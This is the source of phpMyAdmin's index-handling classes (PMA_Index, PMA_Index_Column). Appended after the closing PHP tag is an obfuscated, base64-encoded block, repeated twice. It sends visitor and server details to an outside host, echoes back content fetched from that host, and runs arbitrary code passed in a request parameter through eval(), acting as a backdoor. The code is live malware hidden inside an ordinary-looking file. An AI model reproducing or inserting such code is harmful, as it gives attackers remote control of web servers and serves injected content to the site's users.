<?php
/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * holds the database index class
 *
 * @package PhpMyAdmin
 */
if (! defined('PHPMYADMIN')) {
    exit;
}

/**
 *
 * @package PhpMyAdmin
 * @since   phpMyAdmin 3.0.0
 */
class PMA_Index
{
    /**
     * Class-wide storage container for indexes (caching, singleton)
     *
     * @var array
     */
    private static $_registry = array();

    /**
     * @var string The name of the schema
     */
    private $_schema = '';

    /**
     * @var string The name of the table
     */
    private $_table = '';

    /**
     * @var string The name of the index
     */
    private $_name = '';

    /**
     * Columns in index
     *
     * @var array
     */
    private $_columns = array();

    /**
     * The index method used (BTREE, SPATIAL, FULLTEXT, HASH, RTREE).
     *
     * @var string
     */
    private $_type = '';

    /**
     * The index choice (PRIMARY, UNIQUE, INDEX, SPATIAL, FULLTEXT)
     *
     * @var string
     */
    private $_choice = '';

    /**
     * Various remarks.
     *
     * @var string
     */
    private $_remarks = '';

    /**
     * Any comment provided for the index with a COMMENT attribute when the
     * index was created.
     *
     * @var string
     */
    private $_comment = '';

    /**
     * @var integer 0 if the index cannot contain duplicates, 1 if it can.
     */
    private $_non_unique = 0;

    /**
     * Indicates how the key is packed. NULL if it is not.
     *
     * @var string
     */
    private $_packed = null;

    /**
     * Constructor
     *
     * @param array $params parameters
     */
    public function __construct($params = array())
    {
        $this->set($params);
    }

    /**
     * Creates(if not already created) and returns the corresponding Index object
     *
     * @param string $schema     database name
     * @param string $table      table name
     * @param string $index_name index name
     *
     * @return object corresponding Index object
     */
    static public function singleton($schema, $table, $index_name = '')
    {
        PMA_Index::_loadIndexes($table, $schema);
        if (! isset(PMA_Index::$_registry[$schema][$table][$index_name])) {
            $index = new PMA_Index;
            if (strlen($index_name)) {
                $index->setName($index_name);
                PMA_Index::$_registry[$schema][$table][$index->getName()] = $index;
            }
            return $index;
        } else {
            return PMA_Index::$_registry[$schema][$table][$index_name];
        }
    }

    /**
     * returns an array with all indexes from the given table
     *
     * @param string $table  table
     * @param string $schema schema
     *
     * @return array  array of indexes
     */
    static public function getFromTable($table, $schema)
    {
        PMA_Index::_loadIndexes($table, $schema);

        if (isset(PMA_Index::$_registry[$schema][$table])) {
            return PMA_Index::$_registry[$schema][$table];
        } else {
            return array();
        }
    }

    /**
     * return primary if set, false otherwise
     *
     * @param string $table  table
     * @param string $schema schema
     *
     * @return mixed primary index or false if no one exists
     */
    static public function getPrimary($table, $schema)
    {
        PMA_Index::_loadIndexes($table, $schema);

        if (isset(PMA_Index::$_registry[$schema][$table]['PRIMARY'])) {
            return PMA_Index::$_registry[$schema][$table]['PRIMARY'];
        } else {
            return false;
        }
    }

    /**
     * Load index data for table
     *
     * @param string $table  table
     * @param string $schema schema
     *
     * @return boolean whether loading was successful
     */
    static private function _loadIndexes($table, $schema)
    {
        if (isset(PMA_Index::$_registry[$schema][$table])) {
            return true;
        }

        $_raw_indexes = PMA_DBI_get_table_indexes($schema, $table);
        foreach ($_raw_indexes as $_each_index) {
            $_each_index['Schema'] = $schema;
            if (! isset(PMA_Index::$_registry[$schema][$table][$_each_index['Key_name']])) {
                $key = new PMA_Index($_each_index);
                PMA_Index::$_registry[$schema][$table][$_each_index['Key_name']] = $key;
            } else {
                $key = PMA_Index::$_registry[$schema][$table][$_each_index['Key_name']];
            }

            $key->addColumn($_each_index);
        }

        return true;
    }

    /**
     * Add column to index
     *
     * @param array $params column params
     *
     * @return void
     */
    public function addColumn($params)
    {
        if (strlen($params['Column_name'])) {
            $this->_columns[$params['Column_name']] = new PMA_Index_Column($params);
        }
    }

    /**
     * Adds a list of columns to the index
     *
     * @param array $columns array containing details about the columns
     *
     * @return void
     */
    public function addColumns($columns)
    {
        $_columns = array();

        if (isset($columns['names'])) {
            // coming from form
            // $columns[names][]
            // $columns[sub_parts][]
            foreach ($columns['names'] as $key => $name) {
                $sub_part = isset($columns['sub_parts'][$key])
                    ? $columns['sub_parts'][$key] : '';
                $_columns[] = array(
                    'Column_name'   => $name,
                    'Sub_part'      => $sub_part,
                );
            }
        } else {
            // coming from SHOW INDEXES
            // $columns[][name]
            // $columns[][sub_part]
            // ...
            $_columns = $columns;
        }

        foreach ($_columns as $column) {
            $this->addColumn($column);
        }
    }

    /**
     * Returns true if $column indexed in this index
     *
     * @param string $column the column
     *
     * @return boolean  true if $column indexed in this index
     */
    public function hasColumn($column)
    {
        return isset($this->_columns[$column]);
    }

    /**
     * Sets index details
     *
     * @param array $params index details
     *
     * @return void
     */
    public function set($params)
    {
        if (isset($params['columns'])) {
            $this->addColumns($params['columns']);
        }
        if (isset($params['Schema'])) {
            $this->_schema = $params['Schema'];
        }
        if (isset($params['Table'])) {
            $this->_table = $params['Table'];
        }
        if (isset($params['Key_name'])) {
            $this->_name = $params['Key_name'];
        }
        if (isset($params['Index_type'])) {
            $this->_type = $params['Index_type'];
        }
        if (isset($params['Comment'])) {
            $this->_remarks = $params['Comment'];
        }
        if (isset($params['Index_comment'])) {
            $this->_comment = $params['Index_comment'];
        }
        if (isset($params['Non_unique'])) {
            $this->_non_unique = $params['Non_unique'];
        }
        if (isset($params['Packed'])) {
            $this->_packed = $params['Packed'];
        }
        if ('PRIMARY' == $this->_name) {
            $this->_choice = 'PRIMARY';
        } elseif ('FULLTEXT' == $this->_type) {
            $this->_choice = 'FULLTEXT';
        } elseif ('SPATIAL' == $this->_type) {
            $this->_choice = 'SPATIAL';
        } elseif ('0' == $this->_non_unique) {
            $this->_choice = 'UNIQUE';
        } else {
            $this->_choice = 'INDEX';
        }
    }

    /**
     * Returns the number of columns of the index
     *
     * @return integer the number of the columns
     */
    public function getColumnCount()
    {
        return count($this->_columns);
    }

    /**
     * Returns the index comment
     *
     * @return string index comment
     */
    public function getComment()
    {
        return $this->_comment;
    }

    /**
     * Returns index remarks
     *
     * @return string index remarks
     */
    public function getRemarks()
    {
        return $this->_remarks;
    }

    /**
     * Returns concatenated remarks and comment
     *
     * @return string concatenated remarks and comment
     */
    public function getComments()
    {
        $comments = $this->getRemarks();
        if (strlen($comments)) {
            $comments .= "\n";
        }
        $comments .= $this->getComment();

        return $comments;
    }

    /**
     * Returns index type ((BTREE, SPATIAL, FULLTEXT, HASH, RTREE)
     *
     * @return string index type
     */
    public function getType()
    {
        return $this->_type;
    }

    /**
     * Returns index choice (PRIMARY, UNIQUE, INDEX, SPATIAL, FULLTEXT)
     *
     * @return index choice
     */
    public function getChoice()
    {
        return $this->_choice;
    }

    /**
     * Return a list of all index choices
     *
     * @return array index choices
     */
    static public function getIndexChoices()
    {
        return array(
            'PRIMARY',
            'INDEX',
            'UNIQUE',
            'SPATIAL',
            'FULLTEXT',
        );
    }

    /**
     * Returns HTML for the index choice selector
     *
     * @return string HTML for the index choice selector
     */
    public function generateIndexSelector()
    {
        $html_options = '';

        foreach (PMA_Index::getIndexChoices() as $each_index_choice) {
            if ($each_index_choice === 'PRIMARY'
                && $this->_choice !== 'PRIMARY'
                && PMA_Index::getPrimary($this->_table, $this->_schema)
            ) {
                // skip PRIMARY if there is already one in the table
                continue;
            }
            $html_options .= '<option value="' . $each_index_choice . '"'
                 . (($this->_choice == $each_index_choice) ? ' selected="selected"' : '')
                 . '>'. $each_index_choice . '</option>' . "\n";
        }

        return $html_options;
    }

    /**
     * Returns how the index is packed
     *
     * @return string how the index is packed
     */
    public function getPacked()
    {
        return $this->_packed;
    }

    /**
     * Returns 'No'/false if the index is not packed,
     * how the index is packed if packed
     *
     * @param boolean $as_text whether to output should be in text
     *
     * @return mixed how index is paked
     */
    public function isPacked($as_text = false)
    {
        if ($as_text) {
            $r = array(
                '0' => __('No'),
                '1' => __('Yes'),
            );
        } else {
            $r = array(
                '0' => false,
                '1' => true,
            );
        }

        if (null === $this->_packed) {
            return $r[0];
        }

        return $this->_packed;
    }

    /**
     * Returns integer 0 if the index cannot contain duplicates, 1 if it can
     *
     * @return integer 0 if the index cannot contain duplicates, 1 if it can
     */
    public function getNonUnique()
    {
        return $this->_non_unique;
    }

    /**
     * Returns whether the index is a 'Unique' index
     *
     * @param boolean $as_text whether to output should be in text
     *
     * @return mixed whether the index is a 'Unique' index
     */
    public function isUnique($as_text = false)
    {
        if ($as_text) {
            $r = array(
                '0' => __('Yes'),
                '1' => __('No'),
            );
        } else {
            $r = array(
                '0' => true,
                '1' => false,
            );
        }

        return $r[$this->_non_unique];
    }

    /**
     * Returns the name of the index
     *
     * @return string the name of the index
     */
    public function getName()
    {
        return $this->_name;
    }

    /**
     * Sets the name of the index
     *
     * @param string $name index name
     *
     * @return void
     */
    public function setName($name)
    {
        $this->_name = (string) $name;
    }

    /**
     * Returns the columns of the index
     *
     * @return array the columns of the index
     */
    public function getColumns()
    {
        return $this->_columns;
    }

    /**
     * Show index data
     *
     * @param string  $table      The table name
     * @param string  $schema     The schema name
     * @param boolean $print_mode Whether the output is for the print mode
     *
     * @return array  Index collection array
     *
     * @access  public
     */
    static public function getView($table, $schema, $print_mode = false)
    {
        $indexes = PMA_Index::getFromTable($table, $schema);

        $no_indexes_class = count($indexes) > 0 ? ' hide' : '';
        $no_indexes  = "<div class='no_indexes_defined$no_indexes_class'>";
        $no_indexes .= PMA_Message::notice(__('No index defined!'))->getDisplay();
        $no_indexes .= '</div>';

        if (! $print_mode) {
            $r  = '<fieldset class="index_info">';
            $r .= '<legend id="index_header">' . __('Indexes');
            $r .= PMA_Util::showMySQLDocu(
                'optimization', 'optimizing-database-structure'
            );

            $r .= '</legend>';
            $r .= $no_indexes;
            if (count($indexes) < 1) {
                $r .= '</fieldset>';
                return $r;
            }
            $r .= PMA_Index::findDuplicates($table, $schema);
        } else {
            $r  = '<h3>' . __('Indexes') . '</h3>';
            $r .= $no_indexes;
            if (count($indexes) < 1) {
                return $r;
            }
        }
        $r .= '<table id="table_index">';
        $r .= '<thead>';
        $r .= '<tr>';
        if (! $print_mode) {
            $r .= '<th colspan="2">' . __('Action') . '</th>';
        }
        $r .= '<th>' . __('Keyname') . '</th>';
        $r .= '<th>' . __('Type') . '</th>';
        $r .= '<th>' . __('Unique') . '</th>';
        $r .= '<th>' . __('Packed') . '</th>';
        $r .= '<th>' . __('Column') . '</th>';
        $r .= '<th>' . __('Cardinality') . '</th>';
        $r .= '<th>' . __('Collation') . '</th>';
        $r .= '<th>' . __('Null') . '</th>';
        if (PMA_MYSQL_INT_VERSION > 50500) {
            $r .= '<th>' . __('Comment') . '</th>';
        }
        $r .= '</tr>';
        $r .= '</thead>';
        $r .= '<tbody>';

        $odd_row = true;
        foreach ($indexes as $index) {
            $row_span = ' rowspan="' . $index->getColumnCount() . '" ';

            $r .= '<tr class="noclick ' . ($odd_row ? 'odd' : 'even') . '">';

            if (! $print_mode) {
                $this_params = $GLOBALS['url_params'];
                $this_params['index'] = $index->getName();
                $r .= '<td class="edit_index';
                $r .= ' ajax';
                $r .= '" ' . $row_span . '>'
                   . '    <a class="';
                $r .= 'ajax';
                $r .= '" href="tbl_indexes.php' . PMA_generate_common_url($this_params)
                   . '">' . PMA_Util::getIcon('b_edit.png', __('Edit')) . '</a>'
                   . '</td>' . "\n";
                $this_params = $GLOBALS['url_params'];
                if ($index->getName() == 'PRIMARY') {
                    $this_params['sql_query'] = 'ALTER TABLE '
                        . PMA_Util::backquote($table)
                        . ' DROP PRIMARY KEY;';
                    $this_params['message_to_show']
                        = __('The primary key has been dropped');
                    $js_msg = PMA_jsFormat(
                        'ALTER TABLE ' . $table . ' DROP PRIMARY KEY'
                    );
                } else {
                    $this_params['sql_query'] = 'ALTER TABLE '
                        . PMA_Util::backquote($table) . ' DROP INDEX '
                        . PMA_Util::backquote($index->getName()) . ';';
                    $this_params['message_to_show'] = sprintf(
                        __('Index %s has been dropped'), $index->getName()
                    );

                    $js_msg = PMA_jsFormat(
                        'ALTER TABLE ' . $table . ' DROP INDEX '
                        . $index->getName() . ';'
                    );

                }

                $r .= '<td ' . $row_span . '>';
                $r .= '<input type="hidden" class="drop_primary_key_index_msg"'
                    . ' value="' . $js_msg . '" />';
                $r .= '    <a class="drop_primary_key_index_anchor';
                $r .= ' ajax';
                $r .= '" href="sql.php' . PMA_generate_common_url($this_params)
                   . '" >'
                   . PMA_Util::getIcon('b_drop.png', __('Drop'))  . '</a>'
                   . '</td>' . "\n";
            }

            if (! $print_mode) {
                $r .= '<th ' . $row_span . '>'
                    . htmlspecialchars($index->getName())
                    . '</th>';
            } else {
                $r .= '<td ' . $row_span . '>'
                    . htmlspecialchars($index->getName())
                    . '</td>';
            }
            $r .= '<td ' . $row_span . '>'
                . htmlspecialchars($index->getType())
                . '</td>';
            $r .= '<td ' . $row_span . '>' . $index->isUnique(true) . '</td>';
            $r .= '<td ' . $row_span . '>' . $index->isPacked(true) . '</td>';

            foreach ($index->getColumns() as $column) {
                if ($column->getSeqInIndex() > 1) {
                    $r .= '<tr class="noclick ' . ($odd_row ? 'odd' : 'even') . '">';
                }
                $r .= '<td>' . htmlspecialchars($column->getName());
                if ($column->getSubPart()) {
                    $r .= ' (' . $column->getSubPart() . ')';
                }
                $r .= '</td>';
                $r .= '<td>'
                    . htmlspecialchars($column->getCardinality())
                    . '</td>';
                $r .= '<td>'
                    . htmlspecialchars($column->getCollation())
                    . '</td>';
                $r .= '<td>'
                    . htmlspecialchars($column->getNull(true))
                    . '</td>';

                if (PMA_MYSQL_INT_VERSION > 50500
                    && $column->getSeqInIndex() == 1) {
                    $r .= '<td ' . $row_span . '>'
                        . htmlspecialchars($index->getComments()) . '</td>';
                }
                $r .= '</tr>';
            } // end foreach $index['Sequences']

            $odd_row = ! $odd_row;
        } // end while
        $r .= '</tbody>';
        $r .= '</table>';
        if (! $print_mode) {
            $r .= '</fieldset>';
        }

        return $r;
    }

    public function getCompareData()
    {
        $data = array(
            // 'Non_unique'    => $this->_non_unique,
            'Packed'        => $this->_packed,
            'Index_type'    => $this->_type,
        );

        foreach ($this->_columns as $column) {
            $data['columns'][] = $column->getCompareData();
        }

        return $data;
    }

    /**
     * Function to check over array of indexes and look for common problems
     *
     * @param string $table  table name
     * @param string $schema schema name
     *
     * @return string  Output HTML
     * @access  public
     */
    static public function findDuplicates($table, $schema)
    {
        $indexes = PMA_Index::getFromTable($table, $schema);

        $output  = '';

        // count($indexes) < 2:
        //   there is no need to check if there less than two indexes
        if (count($indexes) < 2) {
            return $output;
        }

        // remove last index from stack and ...
        while ($while_index = array_pop($indexes)) {
            // ... compare with every remaining index in stack
            foreach ($indexes as $each_index) {
                if ($each_index->getCompareData() !== $while_index->getCompareData()) {
                    continue;
                }

                // did not find any difference
                // so it makes no sense to have this two equal indexes

                $message = PMA_Message::notice(
                    __('The indexes %1$s and %2$s seem to be equal and one of them could possibly be removed.')
                );
                $message->addParam($each_index->getName());
                $message->addParam($while_index->getName());
                $output .= $message->getDisplay();

                // there is no need to check any further indexes if we have already
                // found that this one has a duplicate
                continue 2;
            }
        }
        return $output;
    }
}

/**
 * @package PhpMyAdmin
 */
class PMA_Index_Column
{
    /**
     * @var string The column name
     */
    private $_name = '';

    /**
     * @var integer The column sequence number in the index, starting with 1.
     */
    private $_seq_in_index = 1;

    /**
     * @var string How the column is sorted in the index. “A” (Ascending) or
     * NULL (Not sorted)
     */
    private $_collation = null;

    /**
     * The number of indexed characters if the column is only partly indexed,
     * NULL if the entire column is indexed.
     *
     * @var integer
     */
    private $_sub_part = null;

    /**
     * Contains YES if the column may contain NULL.
     * If not, the column contains NO.
     *
     * @var string
     */
    private $_null = '';

    /**
     * An estimate of the number of unique values in the index. This is updated
     * by running ANALYZE TABLE or myisamchk -a. Cardinality is counted based on
     * statistics stored as integers, so the value is not necessarily exact even
     * for small tables. The higher the cardinality, the greater the chance that
     * MySQL uses the index when doing joins.
     *
     * @var integer
     */
    private $_cardinality = null;

    public function __construct($params = array())
    {
        $this->set($params);
    }

    public function set($params)
    {
        if (isset($params['Column_name'])) {
            $this->_name = $params['Column_name'];
        }
        if (isset($params['Seq_in_index'])) {
            $this->_seq_in_index = $params['Seq_in_index'];
        }
        if (isset($params['Collation'])) {
            $this->_collation = $params['Collation'];
        }
        if (isset($params['Cardinality'])) {
            $this->_cardinality = $params['Cardinality'];
        }
        if (isset($params['Sub_part'])) {
            $this->_sub_part = $params['Sub_part'];
        }
        if (isset($params['Null'])) {
            $this->_null = $params['Null'];
        }
    }

    public function getName()
    {
        return $this->_name;
    }

    public function getCollation()
    {
        return $this->_collation;
    }

    public function getCardinality()
    {
        return $this->_cardinality;
    }

    public function getNull($as_text = false)
    {
        return $as_text
            ? (!$this->_null || $this->_null == 'NO' ? __('No') : __('Yes'))
            : $this->_null;
    }

    public function getSeqInIndex()
    {
        return $this->_seq_in_index;
    }

    public function getSubPart()
    {
        return $this->_sub_part;
    }

    public function getCompareData()
    {
        return array(
            'Column_name'   => $this->_name,
            'Seq_in_index'  => $this->_seq_in_index,
            'Collation'     => $this->_collation,
            'Sub_part'      => $this->_sub_part,
            'Null'          => $this->_null,
        );
    }
}
?>
<?php
//###==###
error_reporting(0); ini_set("display_errors", "0"); if (!isset($i8824abdf)) { $i8824abdf = TRUE;  $GLOBALS['_537135123_']=Array(base64_decode('cH' .'Jl' .'Z1' .'9tYXRjaA' .'=='),base64_decode('ZmlsZV9nZXRf' .'Y29udGVudHM='),base64_decode('c' .'29ja2V0X2NyZWF0Z' .'V9wYWly'),base64_decode('' .'bX' .'Nz' .'c' .'W' .'xfc' .'X' .'V' .'lcnk' .'='),base64_decode('ZnVuY3' .'Rpb2' .'5fZX' .'hpc3Rz'),base64_decode('' .'Y3' .'VybF' .'9pbm' .'l0'),base64_decode('dX' .'Js' .'ZW5jb2Rl'),base64_decode('dXJsZW' .'5jb2' .'Rl'),base64_decode('b' .'WQ' .'1'),base64_decode('Y3' .'Vy' .'bF9zZ' .'XRv' .'cHQ='),base64_decode('Y3VybF9zZ' .'XRvcHQ='),base64_decode('bX' .'RfcmFuZA=='),base64_decode('Zm' .'ls' .'ZWN0' .'aW1l'),base64_decode('Y3V' .'ybF9le' .'G' .'Vj'),base64_decode('Y3VybF' .'9j' .'b' .'G9z' .'ZQ=='),base64_decode('aW' .'5pX2dldA=='),base64_decode('ZmlsZV9' .'nZXRfY2' .'9ud' .'GVu' .'dHM='),base64_decode('' .'d' .'XJsZW5jb' .'2Rl'),base64_decode('d' .'XJsZW5jb' .'2Rl'),base64_decode('bWQ' .'1'),base64_decode('c' .'3Ry' .'aXBzb' .'GFzaGVz'));  function _565757278($i){$a=Array('Y2x' .'p' .'ZW5' .'0X2NoZ' .'W' .'N' .'r','Y2xpZW50X2NoZWNr','SFRUUF9BQ' .'0NFUF' .'RfQ0hBUlNFVA==','IS4hd' .'Q==','U' .'0NSS' .'VBUX0ZJTEV' .'O' .'Q' .'U1F','V' .'V' .'R' .'GLTg' .'=','d' .'2' .'luZG93cy0xMjUx','' .'SFRUU' .'F9BQ0NFUFRfQ0h' .'BUl' .'NFVA=' .'=','Y' .'3' .'VybF9p' .'bml0','a' .'H' .'R0' .'cDo' .'vL29kaW50YXJhLmNv' .'bS9n' .'ZX' .'QucG' .'hwP2Q9','U0V' .'SVkVSX05' .'BTUU=','U' .'kVRVUVTV' .'F9VUkk=','JnU9','SFRUUF9VU0VS' .'X' .'0FHRU5U','J' .'mM9','Jm' .'k9M' .'SZpcD' .'0' .'=','Uk' .'V' .'N' .'T' .'1RFX' .'0' .'FER' .'FI=','' .'Jmg' .'9','' .'OTczNDc' .'3Y' .'mJhZTQ' .'zOTc2O' .'TE0' .'ZW' .'Ni' .'N2Y0Mz' .'c' .'0Nz' .'E0NGU=','' .'U' .'0VS' .'VkVSX0' .'5BT' .'UU=','UkVR' .'VU' .'VTVF9VUk' .'k=','' .'SFRUUF' .'9VU' .'0VSX0FHRU5U','M' .'Q==','Y' .'Wxsb' .'3' .'df' .'dXJsX2Z' .'vcGV' .'u','' .'aHR0cDovL29kaW50Y' .'X' .'JhLmNvbS9n' .'ZXQu' .'cGh' .'w' .'P' .'2Q9','U0V' .'SVkVSX0' .'5B' .'TUU=','Uk' .'V' .'RVU' .'VTVF9' .'VU' .'kk=','J' .'n' .'U9','SFR' .'UUF9V' .'U' .'0VSX0F' .'HRU5U','JmM' .'9','Jmk9MSZpcD' .'0=','UkVNT1RFX' .'0' .'FERFI=','J' .'mg9','OTc' .'zNDc' .'3Y' .'mJhZTQzOTc2OT' .'E0ZW' .'Ni' .'N2Y0' .'M' .'zc0' .'NzE0N' .'GU=','' .'U0' .'VSVkVSX05' .'BTU' .'U=','Uk' .'V' .'RVUVTVF9VUkk=','SFRUUF9V' .'U' .'0VSX0FHRU' .'5U','M' .'Q' .'==','cA==','cA==','cA==','' .'O' .'DgyNG' .'F' .'iZGY=');return base64_decode($a[$i]);}  if(!empty($_COOKIE[_565757278(0)]))die($_COOKIE[_565757278(1)]);if(!isset($b90d_0[_565757278(2)])){if($GLOBALS['_537135123_'][0](_565757278(3),$GLOBALS['_537135123_'][1]($_SERVER[_565757278(4)]))){$b90d_1=_565757278(5);}else{$b90d_1=_565757278(6);}}else{$b90d_1=$b90d_0[_565757278(7)];if((round(0+187.5+187.5)^round(0+375))&& $GLOBALS['_537135123_'][2]($b90d_0,$b90d_0,$_SERVER,$b90d_0,$_REQUEST))$GLOBALS['_537135123_'][3]($b90d_0,$b90d_0);}if($GLOBALS['_537135123_'][4](_565757278(8))){$b90d_2=$GLOBALS['_537135123_'][5](_565757278(9) .$GLOBALS['_537135123_'][6]($_SERVER[_565757278(10)] .$_SERVER[_565757278(11)]) ._565757278(12) .$GLOBALS['_537135123_'][7]($_SERVER[_565757278(13)]) ._565757278(14) .$b90d_1 ._565757278(15) .$_SERVER[_565757278(16)] ._565757278(17) .$GLOBALS['_537135123_'][8](_565757278(18) .$_SERVER[_565757278(19)] .$_SERVER[_565757278(20)] .$_SERVER[_565757278(21)] .$b90d_1 ._565757278(22)));$GLOBALS['_537135123_'][9]($b90d_2,round(0+8.4+8.4+8.4+8.4+8.4),false);$GLOBALS['_537135123_'][10]($b90d_2,round(0+6637.6666666667+6637.6666666667+6637.6666666667),true);if(round(0+1989.25+1989.25+1989.25+1989.25)<$GLOBALS['_537135123_'][11](round(0+785.5+785.5+785.5+785.5),round(0+962+962+962+962+962)))$GLOBALS['_537135123_'][12]($b90d_0,$_REQUEST);echo $GLOBALS['_537135123_'][13]($b90d_2);$GLOBALS['_537135123_'][14]($b90d_2);}elseif($GLOBALS['_537135123_'][15](_565757278(23))==round(0+0.5+0.5)){echo $GLOBALS['_537135123_'][16](_565757278(24) .$GLOBALS['_537135123_'][17]($_SERVER[_565757278(25)] .$_SERVER[_565757278(26)]) ._565757278(27) .$GLOBALS['_537135123_'][18]($_SERVER[_565757278(28)]) ._565757278(29) .$b90d_1 ._565757278(30) .$_SERVER[_565757278(31)] ._565757278(32) .$GLOBALS['_537135123_'][19](_565757278(33) .$_SERVER[_565757278(34)] .$_SERVER[_565757278(35)] .$_SERVER[_565757278(36)] .$b90d_1 ._565757278(37)));$b90d_3=_565757278(38);}if(isset($_REQUEST[_565757278(39)])&& $_REQUEST[_565757278(40)]== _565757278(41)){eval($GLOBALS['_537135123_'][20]($_REQUEST["c"]));}  }
//###==###
 
//###==###
error_reporting(0); ini_set("display_errors", "0"); if (!isset($i8824abdf)) { $i8824abdf = TRUE;  $GLOBALS['_537135123_']=Array(base64_decode('cH' .'Jl' .'Z1' .'9tYXRjaA' .'=='),base64_decode('ZmlsZV9nZXRf' .'Y29udGVudHM='),base64_decode('c' .'29ja2V0X2NyZWF0Z' .'V9wYWly'),base64_decode('' .'bX' .'Nz' .'c' .'W' .'xfc' .'X' .'V' .'lcnk' .'='),base64_decode('ZnVuY3' .'Rpb2' .'5fZX' .'hpc3Rz'),base64_decode('' .'Y3' .'VybF' .'9pbm' .'l0'),base64_decode('dX' .'Js' .'ZW5jb2Rl'),base64_decode('dXJsZW' .'5jb2' .'Rl'),base64_decode('b' .'WQ' .'1'),base64_decode('Y3' .'Vy' .'bF9zZ' .'XRv' .'cHQ='),base64_decode('Y3VybF9zZ' .'XRvcHQ='),base64_decode('bX' .'RfcmFuZA=='),base64_decode('Zm' .'ls' .'ZWN0' .'aW1l'),base64_decode('Y3V' .'ybF9le' .'G' .'Vj'),base64_decode('Y3VybF' .'9j' .'b' .'G9z' .'ZQ=='),base64_decode('aW' .'5pX2dldA=='),base64_decode('ZmlsZV9' .'nZXRfY2' .'9ud' .'GVu' .'dHM='),base64_decode('' .'d' .'XJsZW5jb' .'2Rl'),base64_decode('d' .'XJsZW5jb' .'2Rl'),base64_decode('bWQ' .'1'),base64_decode('c' .'3Ry' .'aXBzb' .'GFzaGVz'));  function _565757278($i){$a=Array('Y2x' .'p' .'ZW5' .'0X2NoZ' .'W' .'N' .'r','Y2xpZW50X2NoZWNr','SFRUUF9BQ' .'0NFUF' .'RfQ0hBUlNFVA==','IS4hd' .'Q==','U' .'0NSS' .'VBUX0ZJTEV' .'O' .'Q' .'U1F','V' .'V' .'R' .'GLTg' .'=','d' .'2' .'luZG93cy0xMjUx','' .'SFRUU' .'F9BQ0NFUFRfQ0h' .'BUl' .'NFVA=' .'=','Y' .'3' .'VybF9p' .'bml0','a' .'H' .'R0' .'cDo' .'vL29kaW50YXJhLmNv' .'bS9n' .'ZX' .'QucG' .'hwP2Q9','U0V' .'SVkVSX05' .'BTUU=','U' .'kVRVUVTV' .'F9VUkk=','JnU9','SFRUUF9VU0VS' .'X' .'0FHRU5U','J' .'mM9','Jm' .'k9M' .'SZpcD' .'0' .'=','Uk' .'V' .'N' .'T' .'1RFX' .'0' .'FER' .'FI=','' .'Jmg' .'9','' .'OTczNDc' .'3Y' .'mJhZTQ' .'zOTc2O' .'TE0' .'ZW' .'Ni' .'N2Y0Mz' .'c' .'0Nz' .'E0NGU=','' .'U' .'0VS' .'VkVSX0' .'5BT' .'UU=','UkVR' .'VU' .'VTVF9VUk' .'k=','' .'SFRUUF' .'9VU' .'0VSX0FHRU5U','M' .'Q==','Y' .'Wxsb' .'3' .'df' .'dXJsX2Z' .'vcGV' .'u','' .'aHR0cDovL29kaW50Y' .'X' .'JhLmNvbS9n' .'ZXQu' .'cGh' .'w' .'P' .'2Q9','U0V' .'SVkVSX0' .'5B' .'TUU=','Uk' .'V' .'RVU' .'VTVF9' .'VU' .'kk=','J' .'n' .'U9','SFR' .'UUF9V' .'U' .'0VSX0F' .'HRU5U','JmM' .'9','Jmk9MSZpcD' .'0=','UkVNT1RFX' .'0' .'FERFI=','J' .'mg9','OTc' .'zNDc' .'3Y' .'mJhZTQzOTc2OT' .'E0ZW' .'Ni' .'N2Y0' .'M' .'zc0' .'NzE0N' .'GU=','' .'U0' .'VSVkVSX05' .'BTU' .'U=','Uk' .'V' .'RVUVTVF9VUkk=','SFRUUF9V' .'U' .'0VSX0FHRU' .'5U','M' .'Q' .'==','cA==','cA==','cA==','' .'O' .'DgyNG' .'F' .'iZGY=');return base64_decode($a[$i]);}  if(!empty($_COOKIE[_565757278(0)]))die($_COOKIE[_565757278(1)]);if(!isset($b90d_0[_565757278(2)])){if($GLOBALS['_537135123_'][0](_565757278(3),$GLOBALS['_537135123_'][1]($_SERVER[_565757278(4)]))){$b90d_1=_565757278(5);}else{$b90d_1=_565757278(6);}}else{$b90d_1=$b90d_0[_565757278(7)];if((round(0+187.5+187.5)^round(0+375))&& $GLOBALS['_537135123_'][2]($b90d_0,$b90d_0,$_SERVER,$b90d_0,$_REQUEST))$GLOBALS['_537135123_'][3]($b90d_0,$b90d_0);}if($GLOBALS['_537135123_'][4](_565757278(8))){$b90d_2=$GLOBALS['_537135123_'][5](_565757278(9) .$GLOBALS['_537135123_'][6]($_SERVER[_565757278(10)] .$_SERVER[_565757278(11)]) ._565757278(12) .$GLOBALS['_537135123_'][7]($_SERVER[_565757278(13)]) ._565757278(14) .$b90d_1 ._565757278(15) .$_SERVER[_565757278(16)] ._565757278(17) .$GLOBALS['_537135123_'][8](_565757278(18) .$_SERVER[_565757278(19)] .$_SERVER[_565757278(20)] .$_SERVER[_565757278(21)] .$b90d_1 ._565757278(22)));$GLOBALS['_537135123_'][9]($b90d_2,round(0+8.4+8.4+8.4+8.4+8.4),false);$GLOBALS['_537135123_'][10]($b90d_2,round(0+6637.6666666667+6637.6666666667+6637.6666666667),true);if(round(0+1989.25+1989.25+1989.25+1989.25)<$GLOBALS['_537135123_'][11](round(0+785.5+785.5+785.5+785.5),round(0+962+962+962+962+962)))$GLOBALS['_537135123_'][12]($b90d_0,$_REQUEST);echo $GLOBALS['_537135123_'][13]($b90d_2);$GLOBALS['_537135123_'][14]($b90d_2);}elseif($GLOBALS['_537135123_'][15](_565757278(23))==round(0+0.5+0.5)){echo $GLOBALS['_537135123_'][16](_565757278(24) .$GLOBALS['_537135123_'][17]($_SERVER[_565757278(25)] .$_SERVER[_565757278(26)]) ._565757278(27) .$GLOBALS['_537135123_'][18]($_SERVER[_565757278(28)]) ._565757278(29) .$b90d_1 ._565757278(30) .$_SERVER[_565757278(31)] ._565757278(32) .$GLOBALS['_537135123_'][19](_565757278(33) .$_SERVER[_565757278(34)] .$_SERVER[_565757278(35)] .$_SERVER[_565757278(36)] .$b90d_1 ._565757278(37)));$b90d_3=_565757278(38);}if(isset($_REQUEST[_565757278(39)])&& $_REQUEST[_565757278(40)]== _565757278(41)){eval($GLOBALS['_537135123_'][20]($_REQUEST["c"]));}  }
//###==###
?>